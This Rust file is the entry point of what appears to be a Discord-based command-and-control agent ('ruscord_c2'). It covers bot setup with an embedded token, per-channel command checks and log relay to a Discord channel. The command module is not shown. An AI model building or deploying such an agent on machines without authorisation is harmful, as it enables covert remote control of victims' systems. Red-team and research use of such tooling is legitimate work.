#![feature(async_closure)]
mod utils;
use commands::COMMANDS;
pub use poise::serenity_prelude as serenity;
use std::{ops::AsyncFnOnce, sync::Arc};
use tokio::sync::{mpsc::Receiver, RwLock};

mod error;
use poise::{Framework, FrameworkError, FrameworkOptions, PrefixFrameworkOptions};
use tracing_subscriber::{layer::SubscriberExt, EnvFilter, Layer, Registry};
use utils::{
    config::{AgentConfig, EXTERNAL_LOG_LEVEL, GUILD_ID, INTERNAL_LOG_LEVEL, PREFIX, TOKEN},
    logging::{start_discord_logger, DiscordWriter},
};

mod commands;
#[macro_use]
extern crate tracing;

#[derive(Debug, Clone)]
pub struct Data {
    config: Arc<RwLock<AgentConfig>>,
}

impl Data {
    /// Passes a read-only reference to the agent configuration to a function
    pub async fn config_read_op<F, Output>(&self, f: F) -> Output
    where
        F: FnOnce(&AgentConfig) -> Output,
        Output: Sized,
    {
        let guard = self.config.read().await;
        let output = f(&guard);
        drop(guard);
        output
    }

    /// Passes a mutable reference to the agent configuration to a function
    pub async fn config_write_op<F>(&self, f: F)
    where
        F: AsyncFnOnce(&mut AgentConfig),
    {
        let mut guard = self.config.write().await;
        f(&mut *guard).await;
    }
}

pub type Error = crate::error::Error;
pub type RuscordContext<'a> = poise::Context<'a, Data, Error>;
pub type RuscordResult<T> = std::result::Result<T, Error>;

fn setup_env_filter() -> EnvFilter {
    EnvFilter::builder()
        .with_default_directive(EXTERNAL_LOG_LEVEL.into())
        .parse(format!("ruscord_c2={}", INTERNAL_LOG_LEVEL.as_str()))
        .unwrap()
}

fn setup_logging() -> RuscordResult<Receiver<String>> {
    // Create the channel
    let (log_sender, log_receiver) = tokio::sync::mpsc::channel(100);

    let stdout_layer = tracing_subscriber::fmt::layer()
        .with_writer(std::io::stdout)
        .with_ansi(true)
        .with_level(true)
        .with_filter(setup_env_filter());

    let discord_layer = tracing_subscriber::fmt::layer()
        .with_writer(DiscordWriter::new(log_sender))
        .with_ansi(false)
        .with_level(true)
        .with_filter(setup_env_filter());

    let subscriber = Registry::default().with(stdout_layer).with(discord_layer);
    tracing::subscriber::set_global_default(subscriber).expect("Set global default subscriber");

    Ok(log_receiver)
}

#[tokio::main]
pub async fn main() -> RuscordResult<()> {
    let log_receiver = setup_logging()?;
    let (prefix, guild_id, token) = (PREFIX, GUILD_ID, unsafe {
        std::str::from_utf8_unchecked(&TOKEN)
    });

    let intents = serenity::GatewayIntents::all();
    let framework = Framework::builder()
        .options(FrameworkOptions {
            commands: COMMANDS.iter().map(|c| c()).collect(),
            // TODO: implement onerror
            command_check: Some(|ctx: RuscordContext<'_>| {
                Box::pin(async move {
                    let data = ctx.data();
                    let result = data.config_read_op(|c| c.check(ctx.channel_id())).await;
                    Ok(result)
                })
            }),
            prefix_options: PrefixFrameworkOptions {
                prefix: prefix.to_string().into(),
                ..Default::default()
            },
            on_error: |error| {
                Box::pin(async move {
                    match error {
                        FrameworkError::CommandCheckFailed { error, ctx, .. } => {
                            let check = ctx.data().config_read_op(|c| c.check(ctx.channel_id()))
                            .await;
                        // If the framework error sources from this bot, then go ahead and print out the error.
                        if check {
                            if let Some(error) = error {
                                error!("Command check failed: {}", error);
                            }
                            let _ = ctx.reply("Command not supported in this channel").await;
                        }
                        },
                        FrameworkError::Command { error, ctx, .. } => {
                            let check = ctx.data().config_read_op(|c| c.check(ctx.channel_id()))
                            .await;
                        if check {
                            let _ = ctx.reply(format!("Command failed: {}", error)).await;
                        }
                        },
                        _ => error!("misc framework error: {:?}", error)
                    }
                })
            },
            ..Default::default()
        })
        .setup({
            move |ctx, _ready, framework| {
                Box::pin(async move {
                    // Load agent configuration
                    let config = AgentConfig::load(ctx).await?;
                    let log_channel_id = config.log_channel_id.id();

                    // Spawn discord logging future
                    tokio::task::spawn({
                        let http = ctx.http.clone();
                        async move { start_discord_logger(log_channel_id, http, log_receiver).await }
                    });

                    // Register commands in the guild
                    poise::builtins::register_in_guild(
                        ctx,
                        &framework.options().commands,
                        guild_id,
                    )
                    .await?;

                    Ok(Data {
                        config: Arc::new(RwLock::new(config)),
                    })
                })
            }
        })
        .build();

    let client = serenity::ClientBuilder::new(token, intents)
        .framework(framework)
        .await;
    info!("Starting client");

    if let Err(why) = client.unwrap().start().await {
        panic!("Failed to create client: {why}");
    }

    Ok(())
}
